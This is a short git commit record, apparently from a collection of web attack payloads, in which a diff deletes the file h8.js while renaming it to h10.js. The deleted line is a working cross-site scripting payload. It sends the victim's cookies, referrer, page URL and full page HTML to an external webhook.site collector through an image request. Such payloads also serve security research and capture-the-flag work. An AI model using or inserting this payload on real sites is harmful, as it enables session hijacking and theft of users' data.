724bc6fd33db1434e4c5f6255f8a493dc13c4a67
terjanq <terjanq@users.noreply.github.com>
2020-01-22 21:14:00 +0100

    Update and rename h8.js to h10.js

--- h8.js
+++
@@ -1,1 +0,0 @@
-(new Image()).src=`https://webhook.site/c8c5563a-33e6-4cd2-a4e5-146c5fcbe28b?${document.cookie}&ref=${document.referrer}&url=${encodeURIComponent(location.href)}&body=${encodeURIComponent(document.documentElement.innerHTML)}`;
